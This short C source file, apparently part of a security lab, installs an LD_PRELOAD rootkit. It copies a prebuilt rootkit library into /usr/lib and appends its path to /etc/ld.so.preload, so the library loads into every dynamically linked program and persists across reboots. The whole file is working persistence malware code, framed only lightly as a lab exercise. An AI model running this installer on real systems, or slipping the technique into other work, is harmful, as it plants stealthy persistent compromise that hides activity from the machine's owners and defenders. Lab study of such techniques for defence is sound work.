#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "lab_common.h"

int install_ld_preload(void) {
    printf("[*] Installing LD_PRELOAD persistence rootkit\n");
    
    // Copy the .so to a persistent location
    system("cp assets/build/ld_preload_rootkit.so /usr/lib/libpreload.so 2>/dev/null");
    
    FILE *f = fopen("/etc/ld.so.preload", "a");
    if (!f) {
        perror("[-] Cannot write /etc/ld.so.preload");
        return -1;
    }
    fprintf(f, "/usr/lib/libpreload.so\n");
    fclose(f);
    
    printf("[+] LD_PRELOAD rootkit installed (persists across reboots)\n");
    set_flag("/tmp/.ld_preload_active");
    return 0;
}

int main(void) {
    return install_ld_preload();
}
